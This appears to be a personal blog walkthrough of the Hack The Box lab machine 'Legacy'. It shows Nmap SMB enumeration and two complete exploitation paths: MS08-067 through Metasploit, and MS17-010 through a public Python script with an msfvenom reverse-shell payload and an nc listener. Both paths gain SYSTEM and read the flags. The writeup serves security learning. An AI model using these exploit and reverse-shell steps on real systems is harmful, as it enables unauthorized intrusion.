---
layout: post
title: "HTB - Legacy"
author: "joelczk"
tags: HTB
excerpt_separator: <!--more-->
---
I've just completed Legacy from HTB! In my opinion, Legacy is a rather tedious box, especially for someone unfamiliar with Windows exploit(And trying not to use Metasploit to solve the box!). Here's a quick writeup on how I solved this box.

<!--more-->

## HTB - Legacy
**Box** : Legacy\
**IP Address** : 10.10.10.4\
**Operating System** : Windows

## Remarks

- This box took me a considerable amount of time to complete as I was rather unfamiliar with SMB servers in the Windows environment
- There are 2 ways to exploit this box - the metasploit and non-metasploit way.  Of course, the metasploit way is always easier to go about exploiting, but I would suggest trying to non-metasploit way to really understand what is going on in the box.
- Last but not least, there are times when the box gets buggy and the reverse shell might not work as intended. So, just reset the machine and you should be good to go!

### Enumeration
As with every machine that we have done previously, the first step is to conduct a Nmap scan to identify the open ports. From the Nmap scans, we have identified 2 open ports - `139` and `435`.

Port `139` is a netbios-ssn service while port `435` is a microsoft-ds service. Honestly, while I was doing this box I have absolutely 0 idea what these are. After a prolonged research (and pain), I've come to realized that both of these ports are essentially ports running on SMB services.
> _"Port 139: SMB originally ran on top of NetBios using port 139. NETBIOS is an older transport layer that allows Windows computer to talk to one another on the same network"_
> _"Port 445: Later versions of SMB (After Windows 2000) use Port 445 above a TCP stack that allows SMB to work over the internet"_

Knowing that the 2 ports are running a SMB service, we will now use Namp to find out to type of SMB service running on these ports

```bash
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2021-08-09T17:47:12+03:00
|_smb2-security-mode: Couldnt establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)
```

I've also come to discover that SMBv1 that this box is using is prone to several famous vulnerabilities such as EternalBlue and EternalRomance. Keeping that in mind, I've decided to run a Nmap script to check for potential CVE vulnerabilities. As it turns out, this box is vulnerable to ```CVE 2008-4250``` and ```CVE 2017-0143``` (Fun fact: CVE 2017-0143 is also known as an EternalBlue exploit that was associated with the famous WannaCry ransomware)

```bash
Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: SMB: Failed to receive bytes: ERROR
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```

### Exploitation 1 : CVE 2008-4250

For CVE 2008-4250, we will be using Metasploit to exploit the vulnerability (Can't seem to find any working exploit online :o). In my opinion, this exploit is a much easier way to obtain all the flags since we are granted access to the SMB server with full root privileges.

```bash
msf6 > use exploit/windows/smb/ms08_067_netapi
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms08_067_netapi) > set RHOST 10.10.10.4
RHOST => 10.10.10.4
msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST 10.10.16.250
LHOST => 10.10.16.250
msf6 exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 10.10.16.250:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175174 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.16.250:4444 -> 10.10.10.4:1028) at 2021-08-09 14:35:05 -0400
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

#### Obtaining user flag

```bash
meterpreter > cd ..
meterpreter > cd ..
meterpreter > pwd
C:\
meterpreter > cd Documents\ and\ Settings
meterpreter > pwd
C:\Documents and Settings
meterpreter > ls
Listing: C:\Documents and Settings
==================================

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40777/rwxrwxrwx  0     dir   2017-03-16 02:07:20 -0400  Administrator
40777/rwxrwxrwx  0     dir   2017-03-16 01:20:29 -0400  All Users
40777/rwxrwxrwx  0     dir   2017-03-16 01:20:29 -0400  Default User
40777/rwxrwxrwx  0     dir   2017-03-16 01:32:52 -0400  LocalService
40777/rwxrwxrwx  0     dir   2017-03-16 01:32:42 -0400  NetworkService
40777/rwxrwxrwx  0     dir   2017-03-16 01:33:41 -0400  john

meterpreter > cd john
meterpreter > ls
Listing: C:\Documents and Settings\john
=======================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40555/r-xr-xr-x   0       dir   2017-03-16 01:33:41 -0400  Application Data
40777/rwxrwxrwx   0       dir   2017-03-16 01:33:41 -0400  Cookies
40777/rwxrwxrwx   0       dir   2017-03-16 01:33:41 -0400  Desktop
40555/r-xr-xr-x   0       dir   2017-03-16 01:33:41 -0400  Favorites
40777/rwxrwxrwx   0       dir   2017-03-16 01:33:41 -0400  Local Settings
40555/r-xr-xr-x   0       dir   2017-03-16 01:33:41 -0400  My Documents
100666/rw-rw-rw-  524288  fil   2017-03-16 01:33:41 -0400  NTUSER.DAT
100666/rw-rw-rw-  1024    fil   2017-03-16 01:33:41 -0400  NTUSER.DAT.LOG
40777/rwxrwxrwx   0       dir   2017-03-16 01:33:41 -0400  NetHood
40777/rwxrwxrwx   0       dir   2017-03-16 01:33:41 -0400  PrintHood
40555/r-xr-xr-x   0       dir   2017-03-16 01:33:41 -0400  Recent
40555/r-xr-xr-x   0       dir   2017-03-16 01:33:41 -0400  SendTo
40555/r-xr-xr-x   0       dir   2017-03-16 01:33:41 -0400  Start Menu
40777/rwxrwxrwx   0       dir   2017-03-16 01:33:41 -0400  Templates
100666/rw-rw-rw-  178     fil   2017-03-16 01:33:42 -0400  ntuser.ini

meterpreter > cd Desktop
meterpreter > ls
Listing: C:\Documents and Settings\john\Desktop
===============================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  32    fil   2017-03-16 02:19:32 -0400  user.txt

meterpreter > cat user.txt
```

#### Obtaining the system flag

```bash
meterpreter > cd ..
meterpreter > cd ..
meterpreter > pwd
C:\Documents and Settings
meterpreter > ls
Listing: C:\Documents and Settings
==================================

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40777/rwxrwxrwx  0     dir   2017-03-16 02:07:20 -0400  Administrator
40777/rwxrwxrwx  0     dir   2017-03-16 01:20:29 -0400  All Users
40777/rwxrwxrwx  0     dir   2017-03-16 01:20:29 -0400  Default User
40777/rwxrwxrwx  0     dir   2017-03-16 01:32:52 -0400  LocalService
40777/rwxrwxrwx  0     dir   2017-03-16 01:32:42 -0400  NetworkService
40777/rwxrwxrwx  0     dir   2017-03-16 01:33:41 -0400  john

meterpreter > cd Administrator
meterpreter > ls
Listing: C:\Documents and Settings\Administrator
================================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40555/r-xr-xr-x   0       dir   2017-03-16 02:07:20 -0400  Application Data
40777/rwxrwxrwx   0       dir   2017-03-16 02:07:20 -0400  Cookies
40777/rwxrwxrwx   0       dir   2017-03-16 02:07:20 -0400  Desktop
40555/r-xr-xr-x   0       dir   2017-03-16 02:07:20 -0400  Favorites
40777/rwxrwxrwx   0       dir   2017-03-16 02:07:20 -0400  Local Settings
40555/r-xr-xr-x   0       dir   2017-03-16 02:07:20 -0400  My Documents
100666/rw-rw-rw-  524288  fil   2017-03-16 02:07:20 -0400  NTUSER.DAT
100666/rw-rw-rw-  1024    fil   2017-03-16 02:07:20 -0400  NTUSER.DAT.LOG
40777/rwxrwxrwx   0       dir   2017-03-16 02:07:20 -0400  NetHood
40777/rwxrwxrwx   0       dir   2017-03-16 02:07:20 -0400  PrintHood
40555/r-xr-xr-x   0       dir   2017-03-16 02:07:20 -0400  Recent
40555/r-xr-xr-x   0       dir   2017-03-16 02:07:20 -0400  SendTo
40555/r-xr-xr-x   0       dir   2017-03-16 02:07:20 -0400  Start Menu
40777/rwxrwxrwx   0       dir   2017-03-16 02:07:20 -0400  Templates
100666/rw-rw-rw-  178     fil   2017-03-16 02:07:21 -0400  ntuser.ini

meterpreter > cd Desktop
meterpreter > ls
Listing: C:\Documents and Settings\Administrator\Desktop
========================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  32    fil   2017-03-16 02:18:19 -0400  root.txt

meterpreter > cat root.txt
```

### Exploitation 2 : CVE 2017-0143

For this exploit, we are going to use the script from [here](https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py) to exploit the vulnerability. However, this exploit only works with `python2`. Hence, we will need to first create a virtual environment with `python2` in the local machine. 

To do that, we will first need to install the `virtualenv` module in our local machine and add the `virtualenv` module to path so that we can call it from any directory.

```bash
┌──(kali㉿kali)-[~]
└─$ pip3 install virtualenv 
┌──(kali㉿kali)-[~]
└─$ cd /home/kali/.local/bin  && sudo mv virtualenv /usr/local/bin/
```

Next, we will then create our virtual environment that is running on `python2.7` and activate the virtual environment

```bash
┌──(kali㉿kali)-[~]
└─$ virtualenv --python=/usr/bin/python2.7 /home/kali/Desktop/htb && source htb/bin/activate
```

Next, we will have to clone the repository and install `impacket` using `pip` as it is a dependency that we need later.

```bash
┌──(htb)─(kali㉿kali)-[~]
└─$ git clone https://github.com/helviojunior/MS17-010 && pip install impacket 
```

The exploit runs with the following exploit with the following syntax `send_and_execute.py <IP> <executable_file> [port] [pipe name]`. Hence, we will need to create an executable file that can spawn a reverse shell. 

To do so, we will have to create the executable file with `msfvenom`

```bash
┌──(kali㉿kali)-[~/Desktop/MS17-010]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.250 LPORT=443 EXITFUNC=thread -f exe -a x86 — platform windows -o rev_shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

Next we will have to open a listener shell on the attacker's machine.

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 443
```

All that is left for us to do, is to execute the exploit.

```bash
┌──(htb)─(kali㉿kali)-[~/Desktop/MS17-010]
└─$ python2 send_and_execute.py 10.10.10.4 rev_shell.exe             1 ⨯ 2 ⚙
Trying to connect to 10.10.10.4:445
Target OS: Windows 5.1
Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x8202fd68
SESSION: 0xe1855430
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe1951d00
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe1951da0
overwriting token UserAndGroups
Sending file U0MPM5.exe...
Opening SVCManager on 10.10.10.4.....
Creating service smXX.....
Starting service smXX.....
The NETBIOS connection with the remote host timed out.
Removing service smXX.....
ServiceExec Error on: 10.10.10.4
nca_s_proto_error
Done
```

Finally, we will obtain a connection on the attacker machine. 

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.250] from (UNKNOWN) [10.10.10.4] 1028
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

#### Obtaining user flag

```bash
C:\WINDOWS\system32>cd ../..
cd ../..
C:\>cd Documents and Settings\john\desktop 
cd Documents and Settings\john\desktop
C:\Documents and Settings\john\Desktop>type user.txt
type user.txt
<Redacted user flag>
```

#### Obtaining system flag

```bash
C:\Documents and Settings\john\Desktop>cd ../..
cd ../..
C:\Documents and Settings>cd Administrator\Desktop
cd Administrator\Desktop
C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
<Redacted system flag>
C:\Documents and Settings\Administrator\Desktop>
```